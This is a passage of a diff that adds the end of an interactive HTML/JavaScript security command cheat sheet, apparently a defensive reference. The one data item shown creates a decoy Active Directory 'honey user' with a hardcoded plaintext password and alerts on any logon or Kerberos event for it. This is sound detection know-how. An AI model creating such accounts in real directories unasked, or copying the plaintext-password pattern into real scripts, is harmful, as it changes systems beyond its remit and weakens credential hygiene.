+          {label: 'Create a honey user (PowerShell)', code: `<span class="cmd-str">New-ADUser</span> -Name <span class="str">"BackupAdmin"</span> -Description <span class="str">"Domain Backup Administrator"</span> -AccountPassword (ConvertTo-SecureString "FakePass123!" -AsPlainText -Force) -Enabled $true\n<span class="comment"># Alert on ANY event 4624 / 4768 / 4769 involving this account</span>`, explain: `\`-AccountPassword\` = set a password for the fake account via a secure string; the honey user itself does nothing — the real value is the *rule*, alerting on any authentication or Kerberos activity involving it, since a real admin or script never touches it.`}
+        ]
+      }
+    ]
+  }
+];
+
+const content = document.getElementById('content');
+const sideNav = document.getElementById('side-nav');
+const sectionCount = document.getElementById('section-count');
+const cmdCount = document.getElementById('cmd-count');
+
+let totalCmds = 0;
+
+function buildSidebar() {
+  let html = '';
+  data.forEach((sec, idx) => {
+    html += `
+      <div class="nav-section">
+        <a class="nav-link" href="#${sec.id}" data-id="${sec.id}">
+          <i class="fas ${sec.icon}"></i>
+          <span>${idx + 1}. ${sec.title}</span>
+        </a>
+      </div>
+    `;
+  });
+  sideNav.innerHTML = html;
+}
+
+function buildContent() {
+  let html = '';
+  data.forEach((sec, idx) => {
+    totalCmds += sec.items.length;
+    let itemsHtml = '';
+    sec.items.forEach((item, i) => {
+      let badges = item.badges.map(b => `<span class="badge ${b.type}">${b.label}</span>`).join('');
+      let examplesHtml = item.examples.map(ex => `
+        <div class="cmd-label">${ex.label}</div>
+        <div class="code-block">
+          <button class="copy-btn" data-code="${encodeURIComponent(ex.code.replace(/<[^>]+>/g,''))}"><i class="fas fa-copy"></i> Copy</button>
+          <pre>${ex.code}</pre>
+        </div>
+        ${ex.explain ? `<div class="explain"><i class="fas fa-circle-info explain-icon"></i><span>${formatExplain(ex.explain)}</span></div>` : ''}
+      `).join('');
+      let notesHtml = item.notes ? `<div class="notes ${item.notes.type}">${item.notes.text}</div>` : '';
+      itemsHtml += `
+        <div class="cmd" data-cmd-id="${sec.id}-${i}">
+          <div class="cmd-head">
+            <span class="cmd-name">${highlight(item.name)}</span>
+            <div class="cmd-badges">${badges}</div>
+            <i class="fas fa-chevron-down chevron"></i>
+          </div>
+          <div class="cmd-body">
+            <div class="cmd-desc">${item.desc}</div>
+            ${examplesHtml}
+            ${notesHtml}
+          </div>
+        </div>
+      `;
+    });
+    html += `
+      <section class="section" id="${sec.id}" data-id="${sec.id}">
+        <div class="section-header">
+          <span class="section-num">${String(idx + 1).padStart(2, '0')}</span>
+          <div class="section-icon"><i class="fas ${sec.icon}"></i></div>
+          <span class="section-title">${sec.title}</span>
+          <i class="fas fa-chevron-down section-toggle"></i>
+        </div>
+        <div class="section-body">
+          <p class="section-intro">${sec.intro}</p>
+          ${itemsHtml}
+        </div>
+      </section>
+    `;
+  });
+  content.innerHTML = html;
+  sectionCount.textContent = data.length;
+  cmdCount.textContent = totalCmds;
+}
+
+function formatExplain(text) {
+  // Converts `flag` markers into styled inline code spans for the explanation line.
+  return text.replace(/`([^`]+)`/g, '<code class="explain-code">$1</code>');
+}
+
+function highlight(name) {
+  const parts = name.split(/(\s+|\/)/);
+  if (parts.length > 1) {
+    return `<span class="tool">${parts[0]}</span>${parts.slice(1).join('')}`;
+  }
+  return `<span class="tool">${name}</span>`;
+}
+
+document.addEventListener('click', (e) => {
+  const btn = e.target.closest('.copy-btn');
+  if (btn) {
+    e.stopPropagation();
+    const code = decodeURIComponent(btn.dataset.code);
+    navigator.clipboard.writeText(code).then(() => {
+      btn.classList.add('copied');
+      btn.innerHTML = '<i class="fas fa-check"></i> Copied';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+      }, 1500);
+    });
+    return;
+  }
+
+  const cmdHead = e.target.closest('.cmd-head');
+  if (cmdHead) {
+    cmdHead.parentElement.classList.toggle('open');
+    return;
+  }
+
+  const secHead = e.target.closest('.section-header');
+  if (secHead) {
+    secHead.parentElement.classList.toggle('collapsed');
+    return;
+  }
+});
+
+function setupSidebarObserver() {
+  const sections = document.querySelectorAll('.section');
+  const links = document.querySelectorAll('.nav-link');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.dataset.id;
+        links.forEach(l => l.classList.toggle('active', l.dataset.id === id));
+      }
+    });
+  }, { rootMargin: '-100px 0px -70% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+}
+
+const search = document.getElementById('search');
+const noResults = document.getElementById('no-results');
+
+search.addEventListener('input', (e) => {
+  const q = e.target.value.trim().toLowerCase();
+  let visibleSections = 0;
+
+  document.querySelectorAll('.section').forEach(sec => {
+    let visibleItems = 0;
+    sec.querySelectorAll('.cmd').forEach(cmd => {
+      const text = cmd.textContent.toLowerCase();
+      const match = !q || text.includes(q);
+      cmd.classList.toggle('hidden', !match);
+      if (match) visibleItems++;
+    });
+    const sectionMatches = !q || sec.querySelector('.section-title').textContent.toLowerCase().includes(q) || sec.querySelector('.section-intro').textContent.toLowerCase().includes(q);
+    const show = visibleItems > 0 || sectionMatches;
+    sec.classList.toggle('hidden', !show);
+    if (show) visibleSections++;
+
+    if (q && visibleItems > 0) {
+      sec.classList.remove('collapsed');
+      sec.querySelectorAll('.cmd').forEach(cmd => {
+        if (!cmd.classList.contains('hidden')) cmd.classList.add('open');
+      });
+    } else if (!q) {
+      sec.classList.remove('collapsed');
+      sec.querySelectorAll('.cmd').forEach(cmd => cmd.classList.remove('open'));
+    }
+  });
+
+  noResults.style.display = visibleSections === 0 ? 'block' : 'none';
+});
+
+buildSidebar();
+buildContent();
+setupSidebarObserver();
+
+setTimeout(() => {
+  const firstCmd = document.querySelector('.cmd');
+  if (firstCmd) firstCmd.classList.add('open');
+}, 100);
+</script>
+</body>
+</html>
